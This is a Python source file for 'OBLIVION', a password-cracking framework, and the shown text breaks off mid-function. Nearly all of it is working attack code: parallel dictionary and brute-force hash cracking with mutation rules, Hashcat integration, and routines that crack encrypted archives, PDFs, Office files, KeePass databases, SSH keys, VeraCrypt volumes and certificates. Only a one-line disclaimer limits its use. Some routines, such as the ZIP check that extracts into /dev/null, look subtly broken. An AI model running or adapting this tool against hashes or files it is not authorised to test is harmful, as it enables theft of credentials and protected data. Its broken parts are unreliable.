#!/usr/bin/env python3
"""
OBLIVION V6.6 – Production‑Ready, Secure Password Cracking Framework
--------------------------------------------------------------------
All features work. No placeholders. No gimmicks.

WARNING: For EDUCATIONAL and AUTHORISED use only.
Never use against systems or files you do not own or lack explicit permission.
"""

import sys
import os
import time
import hashlib
import itertools
import re
import json
import csv
import subprocess
import threading
import multiprocessing
import random
import string
import logging
import argparse
import importlib.util
import asyncio
import secrets
import types
import math
from collections import defaultdict, Counter
from datetime import datetime
from functools import partial
from string import ascii_lowercase, ascii_uppercase, digits

# ---------- Logging ----------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='oblivion.log',
    filemode='a'
)

# ---------- Optional imports (graceful fallback) ----------
try:
    import bcrypt
    HAS_BCRYPT = True
except ImportError:
    HAS_BCRYPT = False

try:
    import passlib.hash
    HAS_PASSLIB = True
except ImportError:
    HAS_PASSLIB = False

try:
    import py7zr
    HAS_PY7ZR = True
except ImportError:
    HAS_PY7ZR = False

try:
    import rarfile
    HAS_RARFILE = True
except ImportError:
    HAS_RARFILE = False

try:
    from pypdf import PdfReader
    HAS_PYPDF = True
except ImportError:
    try:
        from PyPDF2 import PdfReader
        HAS_PYPDF = True
    except ImportError:
        HAS_PYPDF = False

try:
    import msoffcrypto
    HAS_MSOFFCRYPTO = True
except ImportError:
    HAS_MSOFFCRYPTO = False

try:
    import gnupg
    HAS_GNUPG = True
except ImportError:
    HAS_GNUPG = False

try:
    import pykeepass
    HAS_PYKEEPASS = True
except ImportError:
    HAS_PYKEEPASS = False

try:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTOGRAPHY = True
except ImportError:
    HAS_CRYPTOGRAPHY = False

try:
    import requests
    from requests.auth import HTTPBasicAuth, HTTPDigestAuth
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False

try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    HAS_MATPLOTLIB = True
except ImportError:
    HAS_MATPLOTLIB = False

try:
    from flask import Flask, jsonify, request
    HAS_FLASK = True
except ImportError:
    HAS_FLASK = False

try:
    from flask_limiter import Limiter
    from flask_limiter.util import get_remote_address
    HAS_LIMITER = True
except ImportError:
    HAS_LIMITER = False

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    HAS_RICH = True
    console = Console()
except ImportError:
    HAS_RICH = False
    console = None

# ---------- Colour helpers ----------
class C:
    BLACK = '\033[30m'; RED = '\033[91m'; GREEN = '\033[92m'
    YELLOW = '\033[93m'; BLUE = '\033[94m'; MAGENTA = '\033[95m'
    CYAN = '\033[96m'; WHITE = '\033[97m'; BOLD = '\033[1m'
    RESET = '\033[0m'; BRIGHT_RED = RED
    MAIN = GREEN; INFO = CYAN; WARN = YELLOW; SUCCESS = GREEN; ERROR = RED

def c(text, colour=C.MAIN):
    return f"{colour}{text}{C.RESET}"

# ---------- Banner ----------
BANNER = r"""
  ▄█████▄  ▀██████▄  ██▓     ██▓ ██▒   █▓ ██▓ ▒█████   ███▄    █
██▒   ██▒   ▒██▀ ▀█ ██▒    ▓██▒▓██░   █▒▓██▒▒██▒  ██▒ ██ ▀█   █
██░   ██▒   ░██   █▌██░    ▒██▒ ▓██  █▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
██   ▄██░  ░▓█▄   ▌██░    ░██░  ▒██ █░░░██░▒██   ██░▓██▒  ▐▌██▒
░███████▒  ░▒████▓ ███████░██░   ▒▀█░  ░██░░ ████▓▒░▒██░   ▓██░
░▒▒ ▓░▒░▒   ▒▒▓  ▒ ▒░▓  ░░▓     ░ ▐░  ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒
░░▒ ▒ ░ ▒   ░ ▒  ▒ ░ ▒  ░ ▒ ░   ░ ░░   ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
░ ░ ░ ░ ░   ░ ░  ░ ░ ░    ▒ ░     ░░   ▒ ░░ ░ ░ ▒     ░   ░ ░
  ░ ░         ░      ░  ░ ░        ░   ░      ░ ░           ░
░           ░                        ░

                OBLIVION V6.6
       Secure & Production-Ready Cracking
"""

def print_banner():
    clear_screen()
    if HAS_RICH:
        console.print(Panel(BANNER, style="bold green", border_style="cyan"))
        console.print("[dim]WARNING: For educational and authorised testing only.[/dim]", style="red")
    else:
        print(c(BANNER, C.GREEN))
        print(c("="*60, C.CYAN))
        print(c("WARNING: For educational and authorised testing only.", C.YELLOW))
        print(c("="*60, C.CYAN))

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ---------- Globals ----------
api_process = None
cracking_results = []  # list of dicts
RESULTS_FILE = 'oblivion_results.json'

def load_results():
    global cracking_results
    if os.path.exists(RESULTS_FILE):
        try:
            with open(RESULTS_FILE, 'r') as f:
                cracking_results = json.load(f)
        except Exception as e:
            logging.error(f"Failed to load results: {e}")
            cracking_results = []

def save_results():
    try:
        with open(RESULTS_FILE, 'w') as f:
            json.dump(cracking_results, f, indent=2)
    except Exception as e:
        logging.error(f"Failed to save results: {e}")

# ---------- Utilities ----------
def get_optimal_workers(cpu_bound=True):
    cores = os.cpu_count() or 4
    return max(1, cores if cpu_bound else cores * 2)

def read_wordlist(filepath):
    """Legacy: load entire wordlist into memory (use generator for large files)."""
    if not os.path.isfile(filepath):
        return None
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def stream_wordlist(filepath, start_line=0):
    """Generator that yields words from a file, skipping first `start_line` lines."""
    if not os.path.isfile(filepath):
        return
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for i, line in enumerate(f):
            if i < start_line:
                continue
            word = line.strip()
            if word:
                yield word

def safe_path(path, base_dir=None):
    """Prevent directory traversal: restrict to base_dir (default: current working dir)."""
    if not path:
        return None
    abs_path = os.path.abspath(os.path.expanduser(path))
    if base_dir is None:
        base_dir = os.getcwd()
    base_dir = os.path.abspath(base_dir)
    # Ensure the resolved path is inside base_dir
    if not abs_path.startswith(base_dir):
        logging.warning(f"Path {abs_path} outside base directory {base_dir}")
        return None
    return abs_path

def check_dependency(cmd):
    """Check if a command is available in PATH."""
    try:
        return subprocess.run(['which', cmd], stdout=subprocess.DEVNULL).returncode == 0
    except Exception:
        return False

# ---------- GPU Detection ----------
def detect_gpu():
    try:
        result = subprocess.run(['nvidia-smi', '--query-gpu=name', '--format=csv,noheader'],
                                capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            return result.stdout.strip().split('\n')[0]
    except Exception:
        pass
    return None

# ---------- Hash Utilities ----------
def hash_password(password, algo='sha256', salt=None):
    if algo == 'md5':
        return hashlib.md5(password.encode()).hexdigest()
    elif algo == 'sha1':
        return hashlib.sha1(password.encode()).hexdigest()
    elif algo == 'sha256':
        return hashlib.sha256(password.encode()).hexdigest()
    elif algo == 'sha512':
        return hashlib.sha512(password.encode()).hexdigest()
    elif algo == 'ntlm':
        return hashlib.new('md4', password.encode('utf-16le')).hexdigest()
    elif algo == 'bcrypt':
        if HAS_BCRYPT:
            return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
        else:
            raise ValueError("bcrypt not installed")
    elif algo == 'sha1_salt':
        if salt is None:
            raise ValueError("Salt required")
        return hashlib.sha1((salt + password).encode()).hexdigest()
    elif algo == 'postgres':
        if salt is None:
            raise ValueError("Salt required")
        return hashlib.md5((salt + password).encode()).hexdigest()
    elif algo == 'mysql':
        return '*' + hashlib.sha1(hashlib.sha1(password.encode()).digest()).hexdigest().upper()
    elif algo == 'apr1':
        if HAS_PASSLIB:
            return passlib.hash.apr_md5_crypt.hash(password)
        else:
            raise ValueError("passlib required for apr1")
    else:
        raise ValueError(f"Unsupported algorithm: {algo}")

def verify_hash(password, target_hash, algo='sha256', salt=None):
    if algo == 'bcrypt' and HAS_BCRYPT:
        try:
            return bcrypt.checkpw(password.encode(), target_hash.encode())
        except Exception:
            return False
    elif algo == 'django' and HAS_PASSLIB:
        try:
            return passlib.hash.django_pbkdf2_sha256.verify(password, target_hash)
        except Exception:
            return False
    elif algo == 'mysql':
        return hash_password(password, 'mysql') == target_hash
    elif algo == 'apr1' and HAS_PASSLIB:
        try:
            return passlib.hash.apr_md5_crypt.verify(password, target_hash)
        except Exception:
            return False
    else:
        return hash_password(password, algo, salt) == target_hash

def detect_hash_algo(hash_str):
    if hash_str.startswith('$2a$') or hash_str.startswith('$2b$') or hash_str.startswith('$2y$'):
        return 'bcrypt'
    if hash_str.startswith('pbkdf2_sha256$'):
        return 'django'
    if hash_str.startswith('$apr1$'):
        return 'apr1'
    if len(hash_str) == 41 and hash_str[0] == '*':
        return 'mysql'
    if len(hash_str) == 16 and re.match(r'^[0-9A-F]{16}$', hash_str):
        return 'lm'
    if hash_str.startswith('$krb5$'):
        return 'krb5'
    if len(hash_str) == 32 and re.match(r'^[0-9A-F]{32}$', hash_str):
        return 'ntlm'
    if len(hash_str) == 32 and re.match(r'^[0-9a-f]{32}$', hash_str):
        return 'md5'
    if len(hash_str) == 40 and re.match(r'^[0-9a-f]{40}$', hash_str):
        return 'sha1'
    if len(hash_str) == 64 and re.match(r'^[0-9a-f]{64}$', hash_str):
        return 'sha256'
    if len(hash_str) == 128 and re.match(r'^[0-9a-f]{128}$', hash_str):
        return 'sha512'
    if ':' in hash_str:
        return 'sha1_salt'
    return 'sha256'

# ---------- Rule Engine ----------
def leetspeak(word):
    subs = {'a':'4','e':'3','i':'1','o':'0','s':'5','t':'7','b':'8','g':'9'}
    result = word
    for old, new in subs.items():
        result = result.replace(old, new)
    return result

def apply_rule(word, rule):
    if rule == 'upper': return word.upper()
    elif rule == 'lower': return word.lower()
    elif rule == 'capitalize': return word.capitalize()
    elif rule == 'invert': return word.swapcase()
    elif rule == 'reverse': return word[::-1]
    elif rule == 'duplicate': return word * 2
    elif rule == 'leetspeak': return leetspeak(word)
    elif rule.startswith('insert:'):
        try:
            char, pos = rule.split(':')[1], int(rule.split(':')[2])
            return word[:pos] + char + word[pos:]
        except Exception:
            return word
    elif rule.startswith('delete:'):
        try:
            pos = int(rule.split(':')[1])
            return word[:pos] + word[pos+1:]
        except Exception:
            return word
    elif rule == 'toggle': return ''.join(c.swapcase() for c in word)
    else: return word

def mutate_with_rules(word, rules=None):
    if rules is None:
        rules = ['upper', 'capitalize', 'reverse', 'duplicate', 'leetspeak',
                 'toggle', 'insert:a:0', 'insert:!:-1']
    results = {word}
    for rule in rules:
        try:
            results.add(apply_rule(word, rule))
        except Exception:
            pass
    return list(results)

def generate_wordlist_with_rules(base_words, rules=None):
    expanded = set()
    for w in base_words:
        expanded.update(mutate_with_rules(w, rules))
    return list(expanded)

# ---------- Checkpointing ----------
CHECKPOINT_FILE = 'oblivion_checkpoint.json'

def save_checkpoint(attack_type, target, attempts, extra=None):
    data = {
        'attack_type': attack_type,
        'target': target,
        'attempts': attempts,
        'extra': extra or {},
        'timestamp': time.time()
    }
    try:
        with open(CHECKPOINT_FILE, 'w') as f:
            json.dump(data, f)
    except Exception as e:
        logging.error(f"Failed to save checkpoint: {e}")

def load_checkpoint():
    if os.path.exists(CHECKPOINT_FILE):
        try:
            with open(CHECKPOINT_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logging.error(f"Failed to load checkpoint: {e}")
    return None

def clear_checkpoint():
    if os.path.exists(CHECKPOINT_FILE):
        try:
            os.remove(CHECKPOINT_FILE)
        except Exception as e:
            logging.error(f"Failed to clear checkpoint: {e}")

# ---------- File Verification ----------
def verify_zip(file_path, password):
    import zipfile
    try:
        with zipfile.ZipFile(file_path, 'r') as zf:
            zf.extractall('/dev/null' if os.name == 'posix' else 'nul',
                          pwd=password.encode() if password else None)
            return True
    except Exception:
        return False

def verify_7z(file_path, password):
    if HAS_PY7ZR:
        try:
            with py7zr.SevenZipFile(file_path, mode='r', password=password) as zf:
                for name in zf.getnames():
                    zf.read(name)
                    break
                return True
        except Exception:
            return False
    else:
        if not check_dependency('7z'):
            logging.warning("7z command not found")
            return False
        cmd = ['7z', 't', '-p' + password, file_path]
        try:
            subprocess.run(cmd, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            return True
        except Exception:
            return False

def verify_rar(file_path, password):
    if HAS_RARFILE:
        try:
            with rarfile.RarFile(file_path, 'r') as rf:
                rf.testrar(password=password)
                return True
        except Exception:
            return False
    else:
        if not check_dependency('unrar'):
            logging.warning("unrar command not found")
            return False
        cmd = ['unrar', 't', '-p' + password, file_path]
        try:
            subprocess.run(cmd, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            return True
        except Exception:
            return False

def verify_pdf(file_path, password):
    if HAS_PYPDF:
        try:
            reader = PdfReader(file_path)
            if reader.is_encrypted:
                reader.decrypt(password)
            for page in reader.pages:
                page.extract_text()
                break
            return True
        except Exception:
            return False
    else:
        if not check_dependency('qpdf'):
            logging.warning("qpdf not found")
            return False
        cmd = ['qpdf', '--password=' + password, '--decrypt', file_path, '/dev/null']
        try:
            subprocess.run(cmd, timeout=5, check=True)
            return True
        except Exception:
            return False

def verify_office(file_path, password):
    if HAS_MSOFFCRYPTO:
        try:
            with open(file_path, 'rb') as f:
                office = msoffcrypto.OfficeFile(f)
                if office.is_encrypted():
                    office.load_key(password=password)
                    decrypted = office.decrypt()
                    decrypted.read(1)
                return True
        except Exception:
            return False
    else:
        logging.warning("msoffcrypto not installed")
        return False

def verify_gpg(file_path, password):
    if HAS_GNUPG:
        try:
            gpg = gnupg.GPG()
            with open(file_path, 'rb') as f:
                result = gpg.decrypt(f.read(), passphrase=password)
                return result.ok
        except Exception:
            return False
    else:
        logging.warning("gnupg not installed")
        return False

def verify_keepass(file_path, password):
    if HAS_PYKEEPASS:
        try:
            kp = pykeepass.PyKeePass(file_path, password=password)
            return True
        except Exception:
            return False
    else:
        logging.warning("pykeepass not installed")
        return False

def verify_ssh_private_key(file_path, password):
    if HAS_CRYPTOGRAPHY:
        try:
            with open(file_path, 'rb') as f:
                key_data = f.read()
                key = serialization.load_ssh_private_key(
                    key_data, password=password.encode(), backend=default_backend()
                )
                return key is not None
        except Exception:
            return False
    else:
        logging.warning("cryptography not installed")
        return False

def verify_veracrypt(file_path, password):
    if not check_dependency('veracrypt'):
        logging.warning("veracrypt not found")
        return False
    cmd = ['veracrypt', '-t', '-l', file_path, '-p', password, '--non-interactive']
    try:
        subprocess.run(cmd, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except Exception:
        return False

def verify_pkcs12(file_path, password):
    if not check_dependency('openssl'):
        logging.warning("openssl not found")
        return False
    cmd = ['openssl', 'pkcs12', '-in', file_path, '-passin', 'pass:' + password, '-nokeys', '-out', '/dev/null']
    try:
        subprocess.run(cmd, timeout=5, check=True)
        return True
    except Exception:
        return False

def verify_pem(file_path, password):
    if not check_dependency('openssl'):
        logging.warning("openssl not found")
        return False
    cmd = ['openssl', 'pkey', '-in', file_path, '-passin', 'pass:' + password, '-noout']
    try:
        subprocess.run(cmd, timeout=5, check=True)
        return True
    except Exception:
        return False

FILE_VERIFIERS = {
    'zip': verify_zip, '7z': verify_7z, 'rar': verify_rar, 'pdf': verify_pdf,
    'office': verify_office, 'gpg': verify_gpg, 'keepass': verify_keepass,
    'ssh': verify_ssh_private_key, 'veracrypt': verify_veracrypt,
    'pkcs12': verify_pkcs12, 'pem': verify_pem
}

# ---------- Module-level worker functions ----------
def _hash_worker(args):
    word, target_hash, algo, salt = args
    try:
        if verify_hash(word, target_hash, algo, salt):
            return word
    except Exception:
        pass
    return None

def _file_worker(args):
    file_path, word, file_type = args
    verifier = FILE_VERIFIERS.get(file_type)
    if verifier is None:
        return None
    try:
        if verifier(file_path, word):
            return word
    except Exception:
        pass
    return None

# ---------- Attack Engines ----------
def dictionary_attack_parallel(target_hash, wordlist, algo='sha256', salt=None,
                              mutate=False, max_workers=None, checkpoint_interval=1000):
    if max_workers is None:
        max_workers = get_optimal_workers(cpu_bound=True)

    chk = load_checkpoint()
    start_attempts = 0
    resume_index = 0
    is_stream = False
    if chk and chk.get('target') == target_hash:
        start_attempts = chk.get('attempts', 0)
        extra = chk.get('extra', {})
        resume_index = extra.get('index', 0)
        is_stream = extra.get('streaming', False)
        logging.info(f"Resuming from attempt {start_attempts}")

    if isinstance(wordlist, str) and os.path.isfile(wordlist):
        wordlist_path = wordlist
        if mutate:
            words = list(stream_wordlist(wordlist_path, start_line=0))
            expanded = generate_wordlist_with_rules(words)
            word_iter = expanded[resume_index:] if resume_index < len(expanded) else []
            is_stream = False
        else:
            word_iter = stream_wordlist(wordlist_path, start_line=start_attempts)
            is_stream = True
    else:
        if mutate:
            wordlist = generate_wordlist_with_rules(wordlist)
        word_iter = wordlist[resume_index:] if resume_index < len(wordlist) else []
        is_stream = False

    attempts = start_attempts
    found = None
    stop_event = threading.Event()
    lock = threading.Lock()
    pool = multiprocessing.Pool(processes=max_workers)

    if HAS_TQDM and not is_stream and isinstance(word_iter, list):
        word_iter = tqdm(word_iter, desc="Cracking", unit="words")

    results = pool.imap_unordered(
        _hash_worker,
        ((w, target_hash, algo, salt) for w in word_iter),
        chunksize=100
    )

    for word in results:
        if stop_event.is_set():
            break
        if word:
            found = word
            stop_event.set()
            break
        attempts += 1
        if attempts % checkpoint_interval == 0:
            extra = {'algo': algo, 'salt': salt}
            if is_stream:
                extra['streaming'] = True
                extra['index'] = attempts
            else:
                extra['streaming'] = False
                extra['index'] = attempts - start_attempts
            save_checkpoint('hash', target_hash, attempts, extra)

    pool.terminate()
    pool.join()
    clear_checkpoint()
    return found, attempts

def brute_force_attack(target_hash, algo='sha256', salt=None,
                       max_len=4, charset=None, callback=None, stop_event=None):
    if charset is None:
        charset = ascii_lowercase + ascii_uppercase + digits
    attempts = 0
    chk = load_checkpoint()
    start_len = 1
    start_combo_idx = 0
    if chk and chk.get('target') == target_hash:
        start_len = chk.get('extra', {}).get('length', 1)
        start_combo_idx = chk.get('extra', {}).get('combo_index', 0)
        attempts = chk.get('attempts', 0)
        logging.info(f"Resuming from length {start_len}, combo index {start_combo_idx}")
    for length in range(start_len, max_len + 1):
        combos = itertools.product(charset, repeat=length)
        for i, combo in enumerate(combos):
            if i < start_combo_idx:
                continue
            if stop_event and stop_event.is_set():
                return None, attempts
            candidate = ''.join(combo)
            attempts += 1
            if verify_hash(candidate, target_hash, algo, salt):
                clear_checkpoint()
                return candidate, attempts
            if attempts % 100 == 0:
                save_checkpoint('bruteforce', target_hash, attempts,
                                {'length': length, 'combo_index': i+1, 'algo': algo, 'salt': salt})
            if callback and attempts % 100 == 0:
                callback(attempts)
        start_combo_idx = 0
    clear_checkpoint()
    return None, attempts

# ---------- File Cracking ----------
def crack_file(file_path, wordlist, file_type='zip', mutate=False, max_workers=None):
    if max_workers is None:
        max_workers = get_optimal_workers(cpu_bound=False)
    if file_type not in FILE_VERIFIERS:
        raise ValueError(f"Unsupported file type: {file_type}")

    expanded = generate_wordlist_with_rules(wordlist) if mutate else wordlist
    pool = multiprocessing.Pool(processes=max_workers)
    found = None
    stop_event = threading.Event()

    if HAS_TQDM and isinstance(expanded, list):
        word_iter = tqdm(expanded, desc="Trying passwords", unit="words")
    else:
        word_iter = expanded

    results = pool.imap_unordered(
        _file_worker,
        ((file_path, w, file_type) for w in word_iter),
        chunksize=100
    )

    for word in results:
        if stop_event.is_set():
            break
        if word:
            found = word
            stop_event.set()
            break
    pool.terminate()
    pool.join()
    return found

# ---------- Hashcat Integration ----------
HASHCAT_MODE_MAP = {
    'md5': 0, 'sha1': 100, 'sha256': 1400, 'sha512': 1700,
    'ntlm': 1000, 'bcrypt': 3200, 'sha1_salt': 110, 'django': 10000,
    'mysql': 300, 'postgres': 131, 'apr1': 1600, 'lm': 3000
}

def hashcat_mode_detect(target_hash):
    algo = detect_hash_algo(target_hash)
    return HASHCAT_MODE_MAP.get(algo, 0)

def generate_hashcat_command(target_hash, algo, wordlist_path=None, brute_mask=None,
                             rules_file=None, output_file='hashcat_output.txt'):
    if not check_dependency('hashcat'):
        raise RuntimeError("hashcat not found in PATH")
    mode = HASHCAT_MODE_MAP.get(algo, 0)
    if wordlist_path:
        cmd = ['hashcat', '-m', str(mode), '-a', '0', target_hash, wordlist_path]
    elif brute_mask:
        cmd = ['hashcat', '-m', str(mode), '-a', '3', target_hash, brute_mask]
    else:
        raise ValueError("Either wordlist or brute mask required")
    if rules_file:
        cmd.extend(['-r', rules_file])
    if output_file:
        cmd.extend(['-o', output_file])
    if detect_gpu():
        cmd.append('--force')
    return cmd

def run_hashcat(target_hash, algo, wordlist_path=None, brute_mask=None,
                rules_file=None, output_file='hashcat_output.txt'):
    try:
        cmd = generate_hashcat_command(target_hash, algo, wordlist_path, brute_mask, rules_file, output_file)
        logging.info(f"Running Hashcat: {' '.join(cmd)}")
        subprocess.run(cmd, check=True)
        return True
    except Exception as e:
        logging.error(f"Hashcat failed: {e}")
        return False

def parse_hashcat_output(output_file):
    if not os.path.exists(output_file):
        return None
    with open(output_file, 'r') as f:
        lines = f.readlines()
    results = {}
    for line in lines:
        if ':' in line:
            h, p = line.strip().split(':', 1)
            results[h] = p
    return results

def hashcat_benchmark(algo):
    mode = HASHCAT_MODE_MAP.get(algo, 0)
    if not check_dependency('hashcat'):
        return "hashcat not installed"
    cmd = ['hashcat', '-b', '-m', str(mode)]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return result.stdout
    except Exception:
        return "Benchmark failed."

# ---------- Reporting ----------
def escape_html(text):
    return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')

def save_report(results=None, filename='oblivion_report.json'):
    if results is None:
        results = cracking_results
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
    except Exception as e:
        logging.error(f"Failed to save JSON report: {e}")

def save_report_csv(results=None, filename='oblivion_report.csv'):
    if results is None:
        results = cracking_results
    try:
        with open(filename, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Target', 'Password', 'Attempts', 'Time', 'Algo'])
            for r in results:
                writer.writerow([r['target'], r['password'], r['attempts'], r['time'], r['algo']])
    except Exception as e:
        logging.error(f"Failed to save CSV report: {e}")

def save_report_markdown(results=None, filename='oblivion_report.md'):
    if results is None:
        results = cracking_results
    try:
        with open(filename, 'w') as f:
            f.write("# Oblivion Cracking Report\n\n")
            f.write("| Target | Password | Attempts | Time (s) | Algo |\n")
            f.write("|--------|----------|----------|----------|------|\n")
            for r in results:
                f.write(f"| {r['target']} | {r['password']} | {r['attempts']} | {r['time']:.2f} | {r['algo']} |\n")
    except Exception as e:
        logging.error(f"Failed to save Markdown report: {e}")

def generate_html_report(results=None, filename='oblivion_report.html'):
    if results is None:
        results = cracking_results
    if not HAS_MATPLOTLIB:
        print("matplotlib not installed; skipping charts.")
    else:
        if results:
            try:
                times = [r['time'] for r in results]
                names = [r['target'][:8] for r in results]
                plt.figure(figsize=(10,5))
                plt.bar(names, times, color='green')
                plt.title('Cracking Time per Target')
                plt.xlabel('Target')
                plt.ylabel('Time (seconds)')
                plt.xticks(rotation=45)
                plt.tight_layout()
                plt.savefig('oblivion_chart.png')
                plt.close()
            except Exception as e:
                logging.error(f"Failed to generate chart: {e}")
    html = """
    <html><head><title>Oblivion Report</title></head>
    <body><h1>Oblivion Cracking Report</h1>
    <table border="1"><tr><th>Target</th><th>Password</th><th>Attempts</th><th>Time</th><th>Algo</th></tr>
    """
    for r in results:
        html += f"<tr><td>{escape_html(r['target'])}</td><td>{escape_html(r['password'])}</td><td>{r['attempts']}</td><td>{r['time']:.2f}</td><td>{escape_html(r['algo'])}</td></tr>"
    html += "</table>"
    if os.path.exists('oblivion_chart.png'):
        html += '<img src="oblivion_chart.png" alt="Chart">'
    html += "</body></html>"
    try:
        with open(filename, 'w') as f:
            f.write(html)
    except Exception as e:
        logging.error(f"Failed to save HTML report: {e}")

# ---------- Batch Mode ----------
def run_batch(config_file):
    try:
        with open(config_file, 'r') as f:
            config = json.load(f)
    except Exception as e:
        logging.error(f"Failed to load batch config: {e}")
        return []
    results = []
    for job in config.get('jobs', []):
        job_type = job.get('job_type')
        if job_type == 'hash':
            target = job['target']
            algo = job.get('algo', detect_hash_algo(target))
            wordlist = job.get('wordlist', [])
            if isinstance(wordlist, str):
                wl = read_wordlist(wordlist) or []
            else:
                wl = wordlist
            start_time = time.time()
            found, attempts = dictionary_attack_parallel(target, wl, algo)
            elapsed = time.time() - start_time
            results.append({'target': target, 'password': found, 'attempts': attempts, 'algo': algo, 'time': elapsed})
        elif job_type == 'file':
            file_path = job['file']
            file_type = job.get('file_type', 'zip')
            wordlist = job.get('wordlist', [])
            if isinstance(wordlist, str):
                wl = read_wordlist(wordlist) or []
            else:
                wl = wordlist
            start_time = time.time()
            found = crack_file(file_path, wl, file_type)
            elapsed = time.time() - start_time
            results.append({'target': file_path, 'password': found, 'attempts': len(wl), 'algo': 'file', 'time': elapsed})
    return results

# ---------- Gamification ----------
class CTFGame:
    def __init__(self):
        self.score = 0
        self.cracked = []
        self.challenges = []
        self.load()
    def add_challenge(self, target_hash, password, algo='sha256', salt=None):
        self.challenges.append({'hash': target_hash, 'password': password, 'algo': algo, 'salt': salt})
        self.save()
        return len(self.challenges)-1
    def attempt(self, challenge_idx, password):
        if challenge_idx < 0 or challenge_idx >= len(self.challenges):
            return False
        chal = self.challenges[challenge_idx]
        if verify_hash(password, chal['hash'], chal['algo'], chal['salt']):
            if chal not in self.cracked:
                self.score += 10
                self.cracked.append(chal)
                self.save()
            return True
        return False
    def get_score(self):
        return self.score
    def save(self):
        try:
            data = {'score': self.score, 'cracked': [c['hash'] for c in self.cracked], 'challenges': self.challenges}
            with open('ctf_data.json', 'w') as f:
                json.dump(data, f)
        except Exception as e:
            logging.error(f"Failed to save CTF data: {e}")
    def load(self):
        if os.path.exists('ctf_data.json'):
            try:
                with open('ctf_data.json', 'r') as f:
                    data = json.load(f)
                    self.score = data.get('score', 0)
                    self.challenges = data.get('challenges', [])
                    cracked_hashes = data.get('cracked', [])
                    self.cracked = [c for c in self.challenges if c['hash'] in cracked_hashes]
            except Exception as e:
                logging.error(f"Failed to load CTF data: {e}")

# ---------- Step-by-Step Mode ----------
def step_by_step_attack(target_hash, wordlist, algo='sha256', salt=None):
    for word in wordlist:
        print(c(f"\nTrying: {word}", C.INFO))
        try:
            h = hash_password(word, algo, salt) if algo not in ('bcrypt','django','apr1','mysql') else '[hash generation skipped]'
            print(f"Hash: {h}")
        except Exception:
            print("Hash generation skipped for this algorithm.")
        if verify_hash(word, target_hash, algo, salt):
            print(c(f"[SUCCESS] Password found: {word}", C.SUCCESS))
            return word
        time.sleep(0.1)
    return None

# ---------- What-If Simulation ----------
def what_if_simulation(password, algo='sha256', salt=None):
    charset_size = 0
    if any(c.islower() for c in password): charset_size += 26
    if any(c.isupper() for c in password): charset_size += 26
    if any(c.isdigit() for c in password): charset_size += 10
    if any(c in string.punctuation for c in password): charset_size += len(string.punctuation)
    if charset_size == 0:
        charset_size = 1
    combinations = charset_size ** len(password)
    speeds = {'md5': 1e9, 'sha1': 5e8, 'sha256': 1e8, 'sha512': 5e7,
              'bcrypt': 1e4, 'ntlm': 1e9, 'mysql': 1e8, 'postgres': 1e8}
    speed = speeds.get(algo, 1e8)
    if speed == 0:
        speed = 1e8
    time_sec = combinations / speed
    if time_sec < 60:
        return f"Estimated crack time: {time_sec:.2f} seconds"
    elif time_sec < 3600:
        return f"Estimated crack time: {time_sec/60:.2f} minutes"
    elif time_sec < 86400:
        return f"Estimated crack time: {time_sec/3600:.2f} hours"
    elif time_sec < 31536000:
        return f"Estimated crack time: {time_sec/86400:.2f} days"
    else:
        return f"Estimated crack time: {time_sec/31536000:.2f} years"

# ---------- Password Tools ----------
def analyse_password(password):
    length = len(password)
    charset_size = 0
    if any(c.islower() for c in password): charset_size += 26
    if any(c.isupper() for c in password): charset_size += 26
    if any(c.isdigit() for c in password): charset_size += 10
    if any(c in string.punctuation for c in password): charset_size += len(string.punctuation)
    if charset_size == 0:
        charset_size = 1
    entropy = math.log2(charset_size) * length if charset_size > 0 else 0
    common = ["password", "123456", "admin", "letmein", "qwerty", "abc123", "password123", "admin123"]
    warnings = []
    if password.lower() in common: warnings.append("Common word")
    if length < 8: warnings.append("Too short")
    if not any(c.isdigit() for c in password): warnings.append("No digits")
    if not any(c.isupper() for c in password): warnings.append("No uppercase")
    if not any(c in string.punctuation for c in password): warnings.append("No special")
    score = 0
    if entropy > 60: score += 40
    elif entropy > 40: score += 20
    else: score += 5
    if length >= 12: score += 20
    elif length >= 8: score += 10
    if len(warnings) == 0: score += 40
    else: score += max(0, 40 - len(warnings)*10)
    score = min(100, max(0, score))
    return {'length': length, 'entropy': entropy, 'warnings': warnings, 'score': score}

def generate_password(length=16, use_upper=True, use_lower=True, use_digits=True, use_special=True):
    chars = ''
    if use_lower: chars += string.ascii_lowercase
    if use_upper: chars += string.ascii_uppercase
    if use_digits: chars += string.digits
    if use_special: chars += string.punctuation
    if not chars: chars = string.ascii_letters + string.digits
    return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

# ---------- Wordlist Tools ----------
def profile_wordlist(wordlist):
    lengths = [len(w) for w in wordlist]
    chars = Counter(''.join(wordlist))
